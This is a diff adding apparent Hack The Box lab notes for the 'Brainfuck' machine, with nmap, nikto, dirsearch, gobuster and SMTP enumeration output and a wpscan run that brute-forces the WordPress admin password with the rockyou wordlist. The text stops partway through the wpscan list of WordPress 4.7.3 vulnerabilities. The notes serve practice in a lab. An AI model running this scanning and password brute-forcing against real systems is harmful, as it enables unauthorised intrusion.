@@ -1,0 +1,878 @@
+
+RECON
+root@kali:~/htb/brainfuck# nmap -sC -sV -p- -vv -oA full 10.10.10.17
+PORT    STATE SERVICE  REASON         VERSION
+22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUvFkWE1DxJj4OsU4DiVLjkxYV2a9pSlMS/78hpx0IejJaFilgNb+RFCyfyhIw5NvsZB6hZiNL0vPDh+MscPd75heIIgx9mczfamsrA2KODdkdgUJPCBWUnF9/VhYQhJpGvo4f6lAwLz7wnmcjhiXencMNkZcweADi5aK0Xp6iFxYcwx6+qy0891gQ5TnVVazkDJNA+QMUamxJRm1tQN5dp/+TeBecWJH2AxQFXsM4wPkIFaE0GsKvYDmGyfy1YL/Gn5IxEqVrhIEYkDH4BQsbvORNueOtJKHoys7EhPF+STpx6ZAXS6AXhS/nJMz6EvubzeGqfBOaDIZN9u5JuCdf
+|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCJcOJZuuBlw9xDXy+VPpezMomPfySGOjABaxw02cmRifvzWE57mh1hlQD6z44IF1lsuW9E2NNH4xB4d8U0O5b0=
+|   256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOokdEAUqLEqEuY1CHNJ2xaDU+L+/0qb3XZO8UIZfrju
+25/tcp  open  smtp     syn-ack ttl 63 Postfix smtpd
+|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+110/tcp open  pop3     syn-ack ttl 63 Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) UIDL USER RESP-CODES TOP AUTH-RESP-CODE CAPA PIPELINING
+143/tcp open  imap     syn-ack ttl 63 Dovecot imapd
+|_imap-capabilities: post-login ENABLE Pre-login LOGIN-REFERRALS IMAP4rev1 more OK have IDLE ID listed capabilities AUTH=PLAINA0001 SASL-IR LITERAL+
+443/tcp open  ssl/http syn-ack ttl 63 nginx 1.10.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/localityName=Athens/organizationalUnitName=IT/emailAddress=orestis@brainfuck.htb
+| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR/localityName=Athens/organizationalUnitName=IT/emailAddress=orestis@brainfuck.htb
+| Public Key type: rsa
+| Public Key bits: 3072
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-04-13T11:19:29
+| Not valid after:  2027-04-11T11:19:29
+| MD5:   cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20
+| SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66
+| -----BEGIN CERTIFICATE-----
+| MIIFQzCCA6ugAwIBAgIJAI24F5h8eY+HMA0GCSqGSIb3DQEBCwUAMIGTMQswCQYD
+| VQQGEwJHUjEPMA0GA1UECAwGQXR0aWNhMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV
+| BAoMDkJyYWluZnVjayBMdGQuMQswCQYDVQQLDAJJVDEWMBQGA1UEAwwNYnJhaW5m
+| dWNrLmh0YjEkMCIGCSqGSIb3DQEJARYVb3Jlc3Rpc0BicmFpbmZ1Y2suaHRiMB4X
+| DTE3MDQxMzExMTkyOVoXDTI3MDQxMTExMTkyOVowgZMxCzAJBgNVBAYTAkdSMQ8w
+| DQYDVQQIDAZBdHRpY2ExDzANBgNVBAcMBkF0aGVuczEXMBUGA1UECgwOQnJhaW5m
+| dWNrIEx0ZC4xCzAJBgNVBAsMAklUMRYwFAYDVQQDDA1icmFpbmZ1Y2suaHRiMSQw
+| IgYJKoZIhvcNAQkBFhVvcmVzdGlzQGJyYWluZnVjay5odGIwggGiMA0GCSqGSIb3
+| DQEBAQUAA4IBjwAwggGKAoIBgQCjBI0m6FWgcLYONyxVeMgc+PuTFJMnMUjMb8BF
+| t0PIDSCt10grCCfzBNDIqfU9byiokyYVvvD+sRoWJQfMjd3I3NXMxHwpcLM6X9oR
+| Twt1iBBJRQkTnHOs1hyCmkiM+kn2W1xdL+mwBylAUlvUReLIDdS5anE7u95ApWsD
+| TTUt/mMUl1DwnCqrNkt3czQzCNfCIwIhbaLjsoXsiVo1fFEr6UpsyiaXad9eTTsl
+| EF9k3rByXrmP1WrkaFLqGhqS4v+rYtsyKGPngjAB664aAvB2sSI0/EuOTa7WOPcV
+| NP3Tga+zx55qXPeo6nqCttOlAKKwiZqba5AgDAjSFdB6Q60dghWSuRYU999Ku6zA
+| DdwP0BoT5+kcZJENY7wx1uzysSMrtCoi8E6bfx42UwNQe/UCDDXErXat90hTB+vV
+| h2vaSdyR0tz3w1iIHBZH5/3rY3f+LyfE9fSg2TbGFgZNDq6O/iykVWb9SG+tl1fA
+| RB208Y1/mOw0+84G9RIjLVMLb0kCAwEAAaOBlzCBlDAdBgNVHQ4EFgQUj12KscJg
+| /6gSHzm+kzSN/psvik8wHwYDVR0jBBgwFoAUj12KscJg/6gSHzm+kzSN/psvik8w
+| DAYDVR0TBAUwAwEB/zALBgNVHQ8EBAMCBeAwNwYDVR0RBDAwLoIRd3d3LmJyYWlu
+| ZnVjay5odGKCGXN1cDNyczNjcjN0LmJyYWluZnVjay5odGIwDQYJKoZIhvcNAQEL
+| BQADggGBAJ11TuRhhSQfq5NHXU5fV5VkCOPUx3yKsWjt93Qm8WDD2rJcZAq8jW59
+| NHDWhzDlKZMyNYv8gKJ8k6HuG3f20yeifKZulGw/YsY6dDtTzO+tooBqzjWb9irh
+| bpMIVXv1xBSuz+f5YGdzpvlMK/Ltt1nEQNjKXaTnjy7OGfp4isMZCzBZeKAKnjdn
+| +s6TgFrFA94B56naXNaNLHvv9WcFKviwDTP2PtDz0fc9hbnZz8oxE5Q6/l50NGUK
+| 6bGCVIjDJfM/SsWPLHb4J6chkJxlZZLmpid+s5PsKSdY0ZZ1Oxb20O2mla77hDSJ
+| d43t/sZRBwWPEWxAHUR8Dj5pcrbCFyi57Qu4ENc5w7H0RhRyd0/OWs6ahn2ef4Qy
+| DSWfdpd5CVBGdSLVlVSjzLcBDmWuyy8q5CTgJ3VzIzOreg93F2mVAF+tlNZRX9rc
+| dFjsS0lwXWRZqd6642VuAtf4HoAFBh9PfBtUx+t1DxCXyY7OTwnvMsnNFg9fw11v
+| krhc81zFeg==
+|_-----END CERTIFICATE-----
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+VULN SCAN
+root@kali:~/htb/brainfuck# nmap -Pn --script vuln 10.10.10.17
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-09 20:26 EST
+Nmap scan report for 10.10.10.17
+Host is up (0.022s latency).
+Not shown: 995 filtered ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+25/tcp  open  smtp
+| smtp-vuln-cve2010-4344: 
+|_  The SMTP server is not Exim: NOT VULNERABLE
+|_sslv2-drown: 
+110/tcp open  pop3
+|_sslv2-drown: 
+143/tcp open  imap
+|_sslv2-drown: 
+443/tcp open  https
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-vuln-cve2011-3192: 
+|   VULNERABLE:
+|   Apache byterange filter DoS
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2011-3192  OSVDB:74721
+|       The Apache web server is vulnerable to a denial of service attack when numerous
+|       overlapping byte ranges are requested.
+|     Disclosure date: 2011-08-19
+|     References:
+|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
+|       http://nessus.org/plugins/index.php?view=single&id=55976
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
+|       http://seclists.org/fulldisclosure/2011/Aug/175
+|_      http://osvdb.org/74721
+| ssl-dh-params: 
+|   VULNERABLE:
+|   Diffie-Hellman Key Exchange Insufficient Group Strength
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+|       of insufficient strength, especially those using one of a few commonly
+|       shared groups, may be susceptible to passive eavesdropping attacks.
+|     Check results:
+|       WEAK DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
+|             Modulus Type: Safe prime
+|             Modulus Source: nginx/1024-bit MODP group with safe prime modulus
+|             Modulus Length: 1024
+|             Generator Length: 8
+|             Public Key Length: 1024
+|     References:
+|_      https://weakdh.org
+|_sslv2-drown: 
+
+root@kali:~/htb/brainfuck# nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn 10.10.10.17
+
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| smtp-enum-users: 
+|   Method RCPT returned a unhandled status code.
+|_  Failed to issue VRFY root command (SMTP VRFY root: failed to receive data: connection closed)
+| smtp-vuln-cve2010-4344: 
+|_  The SMTP server is not Exim: NOT VULNERABLE
+Service Info: Host:  brainfuck
+
+
+WEB ENUM
+root@kali:~/htb/brainfuck# nikto -h https://10.10.10.17
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.17
++ Target Hostname:    10.10.10.17
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=brainfuck.htb/emailAddress=orestis@brainfuck.htb
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=brainfuck.htb/emailAddress=orestis@brainfuck.htb
++ Start Time:         2020-11-09 20:20:04 (GMT-5)
+---------------------------------------------------------------------------
++ Server: nginx/1.10.0 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x58ef50da 0x264 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
++ Hostname '10.10.10.17' does not match certificate's names: brainfuck.htb
++ 7499 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2020-11-09 20:32:05 (GMT-5) (721 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@kali:~/dirsearch# python3 dirsearch.py -u https://10.10.10.17 -e php,html -x 400,401,403
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, html | HTTP method: GET | Threads: 20 | Wordlist size: 7540
+
+Error Log: /root/dirsearch/logs/errors-20-11-09_20-44-58.log
+
+Target: https://10.10.10.17/
+
+Output File: /root/dirsearch/reports/10.10.10.17/_20-11-09_20-44-58.txt
+
+[20:44:58] Starting: 
+[20:45:07] 200 -  612B  - //index.html
+
+root@kali:~/dirsearch# dirb https://10.10.10.17
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Nov  9 20:46:13 2020
+URL_BASE: https://10.10.10.17/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: https://10.10.10.17/ ----
++ https://10.10.10.17/index.html (CODE:200|SIZE:612) 
+
+ADD sup3rs3cr3t.brainfuck.htb TO HOSTS FILE AND SCAN
+
+root@kali:~/htb/brainfuck# nikto -h https://sup3rs3cr3t.brainfuck.htb
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.17
++ Target Hostname:    sup3rs3cr3t.brainfuck.htb
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=brainfuck.htb/emailAddress=orestis@brainfuck.htb
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=brainfuck.htb/emailAddress=orestis@brainfuck.htb
++ Start Time:         2020-11-10 16:16:18 (GMT-5)
+---------------------------------------------------------------------------
++ Server: nginx/1.10.0 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'x-csrf-token' found, with contents: L53GylxlIGUaLC1riDOoOH12OQEK4rROk6qu6XtE
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie flarum_session created without the secure flag
++ Server leaks inodes via ETags, header found with file /, fields: 0x58ef50da 0x264 
++ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
++ Hostname 'sup3rs3cr3t.brainfuck.htb' does not match certificate's names: brainfuck.htb
++ /config.php: PHP Config file may contain database IDs and passwords.
++ OSVDB-3093: /.htaccess: Contains configuration and/or authorization information
++ 8310 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2020-11-10 16:38:30 (GMT-5) (1332 seconds)
+---------------------------------------------------------------------------
+
+root@kali:~/htb/brainfuck# gobuster -k -u https://sup3rs3cr3t.brainfuck.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403' -e -fw
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : https://sup3rs3cr3t.brainfuck.htb/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes : 403,200,204,301,302,307
+[+] Expanded     : true
+=====================================================
+https://sup3rs3cr3t.brainfuck.htb/.htaccess (Status: 200)
+https://sup3rs3cr3t.brainfuck.htb/LICENSE (Status: 200)
+https://sup3rs3cr3t.brainfuck.htb/all (Status: 200)
+https://sup3rs3cr3t.brainfuck.htb/assets (Status: 301)
+https://sup3rs3cr3t.brainfuck.htb/logout (Status: 302)
+https://sup3rs3cr3t.brainfuck.htb/scripts (Status: 301)
+https://sup3rs3cr3t.brainfuck.htb/storage (Status: 301)
+https://sup3rs3cr3t.brainfuck.htb/tags (Status: 200)
+https://sup3rs3cr3t.brainfuck.htb/uploads (Status: 301)
+https://sup3rs3cr3t.brainfuck.htb/vendor (Status: 301)
+=====================================================
+
+ENUM BRAINFUCK WORDPRESS SITE
+root@kali:~/htb/brainfuck# nikto -h https://brainfuck.htb
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.17
++ Target Hostname:    brainfuck.htb
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=brainfuck.htb/emailAddress=orestis@brainfuck.htb
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=brainfuck.htb/emailAddress=orestis@brainfuck.htb
++ Start Time:         2020-11-10 20:39:22 (GMT-5)
+---------------------------------------------------------------------------
++ Server: nginx/1.10.0 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: <https://brainfuck.htb/?rest_route=/>; rel="https://api.w.org/"
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server leaks inodes via ETags, header found with file /, fields: 0x58ef50da 0x264 
++ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
++ /readme.html: This WordPress file reveals the installed version.
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ Cookie wordpress_test_cookie created without the httponly flag
++ /wp-login.php: Wordpress login found
++ 7448 requests: 0 error(s) and 13 item(s) reported on remote host
++ End Time:           2020-11-10 20:55:25 (GMT-5) (963 seconds)
+
+
+root@kali:~/htb/brainfuck# gobuster -k -u https://brainfuck.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403' -e -fw
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : https://brainfuck.htb/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes : 204,301,302,307,403,200
+[+] Expanded     : true
+=====================================================
+https://brainfuck.htb/index.php (Status: 301)
+https://brainfuck.htb/wp-admin (Status: 301)
+https://brainfuck.htb/wp-content (Status: 301)
+https://brainfuck.htb/wp-includes (Status: 301)
+=====================================================
+
+WPSCAN BRAINFUCK
+root@kali:~/htb/brainfuck# wpscan --url https://brainfuck.htb/ --username admin --wordlist /usr/share/wordlists/rockyou.txt --threads 50 --disable-tls-checks --force
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.9.4
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+
+[i] It seems like you have not updated the database for some time
+[i] Last database update: 2018-08-21
+[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > n
+[+] URL: https://brainfuck.htb/
+[+] Started: Tue Nov 10 20:31:51 2020
+
+[+] Interesting header: LINK: <https://brainfuck.htb/?rest_route=/>; rel="https://api.w.org/"
+[+] Interesting header: SERVER: nginx/1.10.0 (Ubuntu)
+[+] XML-RPC Interface available under: https://brainfuck.htb/xmlrpc.php   [HTTP 405]
+[+] Found an RSS Feed: https://brainfuck.htb/?feed=rss2   [HTTP 200]
+[!] Detected 1 user from RSS feed:
++-------+
+| Name  |
++-------+
+| admin |
++-------+
+
+[+] Enumerating WordPress version ...
+
+[+] WordPress version 4.7.3 (Released on 2017-03-06) identified from advanced fingerprinting, meta generator, links opml, stylesheets numbers
+[!] 25 vulnerabilities identified from the version number
+
+[!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
+    Reference: https://wpvulndb.com/vulnerabilities/8807
+    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
+    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
+    Reference: https://core.trac.wordpress.org/ticket/25239
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
+
+[!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
+    Reference: https://wpvulndb.com/vulnerabilities/8815
+    Reference: https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
+[i] Fixed in: 4.7.5
+
+[!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
+    Reference: https://wpvulndb.com/vulnerabilities/8816
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
+[i] Fixed in: 4.7.5
+
+[!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks 
+    Reference: https://wpvulndb.com/vulnerabilities/8817
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
+[i] Fixed in: 4.7.5
+
+[!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
+    Reference: https://wpvulndb.com/vulnerabilities/8818
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
+    Reference: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
+[i] Fixed in: 4.7.5
+
+[!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
+    Reference: https://wpvulndb.com/vulnerabilities/8819
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
+    Reference: https://hackerone.com/reports/203515
+    Reference: https://hackerone.com/reports/203515
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
+[i] Fixed in: 4.7.5
+
+[!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
+    Reference: https://wpvulndb.com/vulnerabilities/8820
+    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
+    Reference: https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
+[i] Fixed in: 4.7.5
+
+[!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/8905
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
+    Reference: https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
+[i] Fixed in: 4.7.6
+
+[!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
+    Reference: https://wpvulndb.com/vulnerabilities/8906
+    Reference: https://medium.com/websec/wordpress-sqli-bbb2afcc8e94
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
+    Reference: https://wpvulndb.com/vulnerabilities/8905
+[i] Fixed in: 4.7.5
+
+[!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
+    Reference: https://wpvulndb.com/vulnerabilities/8910
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41398
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
+[i] Fixed in: 4.7.6
+
+[!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
+    Reference: https://wpvulndb.com/vulnerabilities/8911
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41457
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
+[i] Fixed in: 4.7.6
+
+[!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer 
+    Reference: https://wpvulndb.com/vulnerabilities/8912
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41397
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722
+[i] Fixed in: 4.7.6
+
+[!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed
+    Reference: https://wpvulndb.com/vulnerabilities/8913
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41448
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724
+[i] Fixed in: 4.7.6
+
+[!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
+    Reference: https://wpvulndb.com/vulnerabilities/8914
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41395
+    Reference: https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
+[i] Fixed in: 4.7.6
+
+[!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
+    Reference: https://wpvulndb.com/vulnerabilities/8941
+    Reference: https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
+    Reference: https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
+    Reference: https://twitter.com/ircmaxell/status/923662170092638208
+    Reference: https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
+[i] Fixed in: 4.7.7
+
+[!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
+    Reference: https://wpvulndb.com/vulnerabilities/8966
+    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
+[i] Fixed in: 4.7.8
+
+[!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
+    Reference: https://wpvulndb.com/vulnerabilities/8967
+    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
+[i] Fixed in: 4.7.8
+
+[!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping
+    Reference: https://wpvulndb.com/vulnerabilities/8968
+    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093
+[i] Fixed in: 4.7.8
+
+[!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
+    Reference: https://wpvulndb.com/vulnerabilities/8969
+    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
+[i] Fixed in: 4.7.8
+
+[!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/9006
+    Reference: https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
+    Reference: https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/ticket/42720
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
+[i] Fixed in: 4.7.9
+
+[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
+    Reference: https://wpvulndb.com/vulnerabilities/9021
+    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
+    Reference: https://github.com/quitten/doser.py
+    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
